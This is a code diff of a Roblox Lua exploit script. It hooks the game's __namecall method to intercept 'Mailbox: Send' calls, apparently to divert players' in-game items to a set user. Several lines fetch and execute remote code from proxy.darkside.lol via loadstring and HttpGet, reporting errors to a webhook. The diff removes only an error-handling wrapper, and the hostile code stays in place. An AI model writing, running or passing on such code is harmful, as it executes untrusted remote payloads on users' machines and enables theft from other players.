@@ -57,8 +57,6 @@ loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga
 end
 if not _G.User then _G.User = "lol idk" end
 if not _G.Min then _G.Min = 500000000 end
-local qve,qvx
-qve, qvx=pcall(function()
 local function namecallHook(self, ...)
     local method = getnamecallmethod()
     if method == "InvokeServer" and tostring(self) == "Mailbox: Send" then
@@ -76,10 +74,6 @@ local success, errorOrMessage
 success, oldNamecall = pcall(hookmetamethod, game, "__namecall", newcclosure(namecallHook))
 if not success then
     loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(tostring(success))
-end
-end)
-if not qve then
-loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qvx)
 end
 if dh then
 _G.dx=true
